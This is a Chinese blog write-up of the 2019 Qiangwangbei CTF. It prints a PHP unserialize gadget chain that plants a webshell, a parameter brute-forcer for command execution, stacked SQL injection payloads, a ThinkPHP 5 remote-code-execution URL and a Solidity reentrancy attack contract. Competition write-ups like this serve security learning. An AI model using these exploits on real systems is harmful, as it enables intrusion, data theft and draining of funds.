<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>强网杯2019writeup | Altm4nz</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  
  <meta name="keywords" content="web" />
  
  
  
  
  <meta name="description" content="WEBupload审计分析先收集信息，找到源代码www.tar.gz开始代码审计。每个控制器中都定义了类，尝试寻找反序列化的点。在login中发现cookie的序列化过程">
<meta name="keywords" content="web">
<meta property="og:type" content="article">
<meta property="og:title" content="强网杯2019writeup">
<meta property="og:url" content="http://altman.vip/2018/04/07/强网杯2019writeup/index.html">
<meta property="og:site_name" content="Altm4nz">
<meta property="og:description" content="WEBupload审计分析先收集信息，找到源代码www.tar.gz开始代码审计。每个控制器中都定义了类，尝试寻找反序列化的点。在login中发现cookie的序列化过程">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="http://altman.vip/2018/04/07/强网杯2019writeup/15587965945276/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-05-27%20%E4%B8%8A%E5%8D%8811.12.52.png">
<meta property="og:image" content="http://altman.vip/2018/04/07/强网杯2019writeup/15587965945276/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-05-27%20%E4%B8%8A%E5%8D%8811.17.10.png">
<meta property="og:image" content="http://altman.vip/2018/04/07/强网杯2019writeup/15587965945276/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-05-27%20%E4%B8%8A%E5%8D%8811.22.03.png">
<meta property="og:image" content="http://altman.vip/2018/04/07/强网杯2019writeup/15587965945276/15589297130459.jpg">
<meta property="og:image" content="http://altman.vip/2018/04/07/强网杯2019writeup/15587965945276/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-05-27%20%E4%B8%8B%E5%8D%8812.02.36.png">
<meta property="og:image" content="http://altman.vip/2018/04/07/强网杯2019writeup/15587965945276/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-05-27%20%E4%B8%8B%E5%8D%8812.06.17.png">
<meta property="og:image" content="http://altman.vip/2018/04/07/强网杯2019writeup/15587965945276/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-05-27%20%E4%B8%8B%E5%8D%8812.07.49.png">
<meta property="og:image" content="http://altman.vip/2018/04/07/强网杯2019writeup/15587965945276/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-05-27%20%E4%B8%8B%E5%8D%8812.11.26.png">
<meta property="og:image" content="http://altman.vip/2018/04/07/强网杯2019writeup/15587965945276/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-05-27%20%E4%B8%8A%E5%8D%8811.29.46.png">
<meta property="og:image" content="http://altman.vip/2018/04/07/强网杯2019writeup/15587965945276/15589279018437.jpg">
<meta property="og:image" content="http://altman.vip/2018/04/07/强网杯2019writeup/15587965945276/15589280222995.jpg">
<meta property="og:image" content="http://altman.vip/2018/04/07/强网杯2019writeup/15587965945276/C6B56DE8FEB563045E51901442AA1380.jpg">
<meta property="og:image" content="http://altman.vip/2018/04/07/强网杯2019writeup/15587965945276/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-05-27%20%E4%B8%8A%E5%8D%8811.35.29.png">
<meta property="og:image" content="http://altman.vip/2018/04/07/强网杯2019writeup/15587965945276/15589284998213.jpg">
<meta property="og:image" content="http://altman.vip/2018/04/07/强网杯2019writeup/15587965945276/788BCCDA110BDF3D121071BE06087E65.jpg">
<meta property="og:image" content="http://altman.vip/2018/04/07/强网杯2019writeup/15587965945276/E49C45F46049C891DFAD6EEE3662C1C9.jpg">
<meta property="og:image" content="http://altman.vip/2018/04/07/强网杯2019writeup/15587965945276/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-05-27%20%E4%B8%8A%E5%8D%8811.41.53.png">
<meta property="og:updated_time" content="2019-05-27T05:04:43.956Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="强网杯2019writeup">
<meta name="twitter:description" content="WEBupload审计分析先收集信息，找到源代码www.tar.gz开始代码审计。每个控制器中都定义了类，尝试寻找反序列化的点。在login中发现cookie的序列化过程">
<meta name="twitter:image" content="http://altman.vip/2018/04/07/强网杯2019writeup/15587965945276/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-05-27%20%E4%B8%8A%E5%8D%8811.12.52.png">
  
    <link rel="alternate" href="/atom.xml" title="Altm4nz" type="application/atom+xml">
  
  <link rel="icon" href="/css/images/pokemon.ico">
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
  <style type="text/css">
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}</style>
    
  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Yanone+Kaffeesatz%3A200%2C300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">

  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Oswald%3A300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
  <link rel="stylesheet" href="/css/style.css">

  <script src="/js/jquery-3.1.1.min.js"></script>

  <!-- Bootstrap core CSS -->
  <link rel="stylesheet" href="/css/bootstrap.css" >
  <link rel="stylesheet" href="/css/fashion.css" >
  <link rel="stylesheet" href="/css/glyphs.css" >

</head>



  <body data-spy="scroll" data-target="#toc" data-offset="50">


  


<header id="allheader" class="site-header" role="banner" 
   >
  <div class="clearfix container">
      <div class="site-branding">

          <h1 class="site-title">
            
              <a href="/" title="Altm4nz" rel="home"> Altm4nz </a>
            
          </h1>
          
          
            
          <nav id="main-navigation" class="main-navigation" role="navigation">
            <a class="nav-open">Menu</a>
            <a class="nav-close">Close</a>

            <div class="clearfix sf-menu">
              <ul id="main-nav" class="menu sf-js-enabled sf-arrows"  style="touch-action: pan-y;">
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/">Home</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/archives">Archives</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/tags">Tags</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/friend">friend</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/about">About</a> </li>
                    
              </ul>
            </div>
          </nav>

      </div>
  </div>
</header>


  <div id="container">
    <div id="wrap">
            
      <div id="content" class="outer">
        
          <section id="main" style="float:none;"><article id="post-强网杯2019writeup" style="width: 66%; float:left;" class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" class="article-title" itemprop="name">
      强网杯2019writeup
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2018/04/07/强网杯2019writeup/" class="article-date">
	  <time datetime="2018-04-07T14:36:37.000Z" itemprop="datePublished">April 7, 2018</time>
	</a>

       
      
	<span id="busuanzi_container_page_pv">
	  本文总阅读量<span id="busuanzi_value_page_pv"></span>次
	</span>

    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><h3 id="审计分析"><a href="#审计分析" class="headerlink" title="审计分析"></a>审计分析</h3><p>先收集信息，找到源代码<a href="http://www.tar.gz" target="_blank" rel="noopener">www.tar.gz</a><br>开始代码审计。每个控制器中都定义了类，尝试寻找反序列化的点。<br>在login中发现cookie的序列化过程<br><a id="more"></a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (md5($password) === $user_info[<span class="string">'password'</span>]) &#123;</span><br><span class="line">                    $cookie_data=base64_encode(serialize($user_info));</span><br><span class="line">                    cookie(<span class="string">"user"</span>,$cookie_data,<span class="number">3600</span>);</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;success(<span class="string">'Login successful!'</span>, url(<span class="string">'../home'</span>));</span><br></pre></td></tr></table></figure></p>
<p>又在logincheck函数中发现了反序列化的点<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login_check</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $profile=cookie(<span class="string">'user'</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($profile))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;profile=unserialize(base64_decode($profile));</span><br><span class="line">            <span class="keyword">$this</span>-&gt;profile_db=db(<span class="string">'user'</span>)-&gt;where(<span class="string">"ID"</span>,intval(<span class="keyword">$this</span>-&gt;profile[<span class="string">'ID'</span>]))-&gt;find();</span><br><span class="line">            <span class="keyword">if</span>(array_diff(<span class="keyword">$this</span>-&gt;profile_db,<span class="keyword">$this</span>-&gt;profile)==<span class="keyword">null</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<p>反序列话的参数可以控制，接下来寻找可用的类。<br>继续审计注意到Profile类中有<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename);</span><br></pre></td></tr></table></figure></p>
<p>在我们上传文件时，最终生成的文件是文件名的md5加上png后缀<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename_tmp=$_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename=md5($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]).<span class="string">".png"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ext_check();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p>
<p>但是如果我们在不上传文件的情况下，既empty($_FILES)=1时调用upload_img()函数，就可以控制文件名后缀了。<br>下面构造攻击链<br>注意到register中<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checker-&gt;index();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<p>这里调用了index()方法，那么我们可以用他来触发_call,<br>而Profile中的_call方法可以触发_get,<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[$name];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<p>而我们只要控制好except的值，就可以调用任意方法。</p>
<p>那么我们攻击链就很明显了<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">Register-&gt;</span><span class="bash">__destruct</span></span><br><span class="line"><span class="meta">Profile-&gt;</span><span class="bash"> __call</span></span><br><span class="line"><span class="meta">Profile-&gt;</span><span class="bash"> __get</span></span><br><span class="line"><span class="meta">Profile-&gt;</span><span class="bash"> upload_img()</span></span><br></pre></td></tr></table></figure></p>
<p>控制filename参数，讲我们上传的内容重命名后缀。<br>生成序列化脚本<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $registed;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $filename_tmp;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $upload_menu;</span><br><span class="line">    <span class="keyword">public</span> $ext;</span><br><span class="line">    <span class="keyword">public</span> $img;</span><br><span class="line">    <span class="keyword">public</span> $except;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=<span class="keyword">new</span> Register();</span><br><span class="line">$a-&gt;registed=<span class="number">0</span>;</span><br><span class="line">$a-&gt;checker=<span class="keyword">new</span> Profile();</span><br><span class="line">$a-&gt;checker-&gt;except=<span class="keyword">array</span>(<span class="string">'index'</span>=&gt;<span class="string">'upload_img'</span>);</span><br><span class="line">$a-&gt;checker-&gt;ext=<span class="number">1</span>;</span><br><span class="line">$a-&gt;checker-&gt;filename_tmp=<span class="string">"./upload/08856017fa6b6b422db719c5519123dc/da5402f0aef9e4efbb5a9c9bb8566e7b.png"</span>;</span><br><span class="line">$a-&gt;checker-&gt;filename=<span class="string">"./upload/altman.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($a));</span><br></pre></td></tr></table></figure></p>
<p>###开始操作<br>先上传一个带有恶意代码的png图片上去，然后在源代码找到图片地址。<br><img src="/2018/04/07/强网杯2019writeup/15587965945276/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-05-27%20%E4%B8%8A%E5%8D%8811.12.52.png" alt="屏幕快照 2019-05-27 上午11.12.52"></p>
<p>然后讲cookie替换成生成的序列化数据<br><img src="/2018/04/07/强网杯2019writeup/15587965945276/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-05-27%20%E4%B8%8A%E5%8D%8811.17.10.png" alt="屏幕快照 2019-05-27 上午11.17.10"><br>刷新后访问首页。<br>之后再去访问刚才图片发现已经被删除了，访问altman.php后缀发现代码成功执行，getshell。然后根目录拿flag就行了。<br><img src="/2018/04/07/强网杯2019writeup/15587965945276/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-05-27%20%E4%B8%8A%E5%8D%8811.22.03.png" alt="屏幕快照 2019-05-27 上午11.22.03"></p>
<h2 id="高明的黑客"><a href="#高明的黑客" class="headerlink" title="高明的黑客"></a>高明的黑客</h2><p>下载源码拿到上千个混淆文件，每个文件又有许多参数。<br>猜测应该会有一个文件中有存在命令执行，尝试本地进行爆破<br>使用eval和system都能执行的命令echo来测试<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># -*- author:altman -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">"http://127.0.0.1/web2/"</span></span><br><span class="line">rr = re.compile(<span class="string">r'(_GET\[\')(.*)(\'\])'</span>)</span><br><span class="line">cmd=<span class="string">"echo 66666;"</span></span><br><span class="line"></span><br><span class="line">file=os.listdir(<span class="string">'/Users/a1tm4nz/site/web2/'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> file:</span><br><span class="line">    url1 = <span class="string">"http://127.0.0.1/web2/"</span>+i</span><br><span class="line">    x=open(<span class="string">'/Users/a1tm4nz/site/web2/'</span>+i)</span><br><span class="line">    content=x.read()</span><br><span class="line">    get=rr.findall(content)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> get:</span><br><span class="line">        url2=url1+<span class="string">"?"</span>+j[<span class="number">1</span>]+<span class="string">"="</span>+cmd</span><br><span class="line">        r=requests.get(url=url2)</span><br><span class="line">        <span class="keyword">print</span> url2</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"66666"</span> <span class="keyword">in</span> r.content:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"GET it"</span></span><br><span class="line">            <span class="keyword">print</span> url2</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure></p>
<p>爆破了6分钟后果然找到了一个可以执行命令的地方<br><img src="/2018/04/07/强网杯2019writeup/15587965945276/15589297130459.jpg" alt="-w664"><br>然后执行命令拿到flag<br><img src="/2018/04/07/强网杯2019writeup/15587965945276/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-05-27%20%E4%B8%8B%E5%8D%8812.02.36.png" alt="屏幕快照 2019-05-27 下午12.02.36"></p>
<p>##随便注<br>随手测试发现过滤这些内容<br><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return preg_match("/<span class="keyword">select</span>|<span class="keyword">update</span>|<span class="keyword">delete</span>|<span class="keyword">drop</span>|<span class="keyword">insert</span>|<span class="keyword">where</span>|\./i<span class="string">", $inject);</span></span><br></pre></td></tr></table></figure></p>
<p>过滤了select和. 正常的注入思路基本行不通。<br>发现可以堆叠注入。<br>尝试<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=1%27;<span class="keyword">show</span> <span class="keyword">tables</span>;</span><br></pre></td></tr></table></figure></p>
<p>得到表名<img src="/2018/04/07/强网杯2019writeup/15587965945276/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-05-27%20%E4%B8%8B%E5%8D%8812.06.17.png" alt="屏幕快照 2019-05-27 下午12.06.17"><br>又通过<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=<span class="number">1</span>%<span class="number">27</span>;show%<span class="number">20</span>create%<span class="number">20</span>table%<span class="number">20</span>`<span class="number">1919810931114514</span>`;</span><br></pre></td></tr></table></figure></p>
<p>得到表结构<br><img src="/2018/04/07/强网杯2019writeup/15587965945276/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-05-27%20%E4%B8%8B%E5%8D%8812.07.49.png" alt="屏幕快照 2019-05-27 下午12.07.49"><br>然后就卡住了很久。<br>发现没有过滤alter<br>因此可以通过修改表结构和表名的来让页面直接查询flag。<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">';alter <span class="keyword">table</span> words <span class="keyword">rename</span> xxx;alter <span class="keyword">table</span> `1919810931114514` <span class="keyword">rename</span> words;#</span><br></pre></td></tr></table></figure></p>
<p>此时把flag所在表改名成words，回到首页直接查询发现报错，缺少id字段。<br>重置环境，给表中加入id字段<br><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">';alter <span class="built_in">table</span> `<span class="number">1919810931114514</span>` add(id int <span class="keyword">default</span> <span class="number">1</span>);alter <span class="built_in">table</span> words rename xxx;alter <span class="built_in">table</span> `<span class="number">1919810931114514</span>` rename words;<span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
<p>再查询。<br><img src="/2018/04/07/强网杯2019writeup/15587965945276/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-05-27%20%E4%B8%8B%E5%8D%8812.11.26.png" alt="屏幕快照 2019-05-27 下午12.11.26"></p>
<h2 id="护网先锋上单"><a href="#护网先锋上单" class="headerlink" title="护网先锋上单"></a>护网先锋上单</h2><p>看log后便知是一个tp5.3 below命令执行<br>只用log中的poc去打就行了</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://49.4.23.26:31960/1/public/index.php?s=index/think\app/invokefunction&amp;function=call<span class="emphasis">_user_</span>func_array&amp;vars[<span class="string">0</span>]=system&amp;vars[<span class="string">1</span>][<span class="symbol"></span>]=cat+/flag</span><br></pre></td></tr></table></figure>
<p>#CRYPTO</p>
<p>##BABYBANK<br>我们通过合约地址进行逆向得到合约的逆向代码(<a href="https://ethervm.io/decompile/" target="_blank" rel="noopener">https://ethervm.io/decompile/</a>)<br><img src="/2018/04/07/强网杯2019writeup/15587965945276/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-05-27%20%E4%B8%8A%E5%8D%8811.29.46.png" alt="屏幕快照 2019-05-27 上午11.29.46"><br>由代码分析我们得出代码中的关键函数分别为：guess、profit、transfer、withdraw。<br>且合约中存在两个关键变量：balance（余额）以及level（一种标记）。<br>在审计合约之后我们发现<br>profit函数：每个账户只允许调用一次，并发送钱包1 token；<br>guess函数需要level值为1且调用后余额+1、leve+1 ；<br>而transfer函数满足必须balance与level同时为2才能调用，且调用后收款方余额变为2，且转账方余额变为0 ；<br>withdraw函数表示取款，且合约会将以太币转给msg.sender。<br>然而漏洞点就在withdraw中。熟悉区块链的人都知道此处使用.call方法进行转账，而这种方法会调用收款方的fallback函数，从而引发重入攻击。<br>于是我们利用此来进行攻击。我们还看到withdraw中还存在如下方法：<br><img src="/2018/04/07/强网杯2019writeup/15587965945276/15589279018437.jpg" alt=""><br>当存在减法且没有判断时，我们就可以认定这里存在溢出，然而要满足溢出条件需要storage[temp2]&lt;temp1。可是前面代码加了判断，所以我们需要在中间调用.call时进行对余额的操作从而让其减小。<br>我们可以在合约调用如下句子的时候调用收款人的fallback函数从而再次执行withdraw，加入合约余额为2，转账金额设置为2。而在中间进行调用可以很好的绕过余额的检测，从而达成2-2-2的情况，从而溢出。<br>贴上攻击合约<br><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">contract hack&#123;</span><br><span class="line">	babybank a;</span><br><span class="line">	uint <span class="built_in">count</span> = <span class="number">0</span>;</span><br><span class="line">	event <span class="built_in">log</span>(uint256);</span><br><span class="line">	constructor(address b)<span class="keyword">public</span>&#123;</span><br><span class="line">        a = babybank(b);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span></span> () <span class="keyword">public</span> payable &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">count</span>==<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="built_in">log</span>(<span class="number">3</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">count</span> = <span class="built_in">count</span> + <span class="number">1</span>;</span><br><span class="line">      a.withdraw(<span class="number">2</span>);</span><br><span class="line">        <span class="built_in">log</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span></span> getMoney() <span class="keyword">public</span> payable&#123;&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span></span> hacker() <span class="keyword">public</span>&#123;</span><br><span class="line">    	a.withdraw(<span class="number">2</span>);</span><br><span class="line">    	<span class="built_in">log</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span></span> payforflag1(string md5ofteamtoken,string b64email) <span class="keyword">public</span>&#123;</span><br><span class="line">        a.payforflag(md5ofteamtoken,b64email);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span></span> kill() &#123;</span><br><span class="line">   </span><br><span class="line">      selfdestruct(xd630cb8c3bbfd38d1880b8256ee06d168ee3859c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="/2018/04/07/强网杯2019writeup/15587965945276/15589280222995.jpg" alt="-w594"><br>1 由于合约本身没有以太币，所以我们先生成合约A调用自杀函数给题目转钱。<br>2 进行转账操作，我们使用账户B分别调用profit()、guess()、transfer()给C账户转2token。<br>3 当C有了2token便可以进行攻击，调用hacker函数即可。<br>PS：由于合约需要前四位为“b1b1”的账户，所以我们需要<a href="https://vanity-eth.tk/来生成相应的账户B。" target="_blank" rel="noopener">https://vanity-eth.tk/来生成相应的账户B。</a><br><img src="/2018/04/07/强网杯2019writeup/15587965945276/C6B56DE8FEB563045E51901442AA1380.jpg" alt="C6B56DE8FEB563045E51901442AA1380"></p>
<p>调动成功后在邮箱收到flag<br><img src="/2018/04/07/强网杯2019writeup/15587965945276/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-05-27%20%E4%B8%8A%E5%8D%8811.35.29.png" alt="屏幕快照 2019-05-27 上午11.35.29"></p>
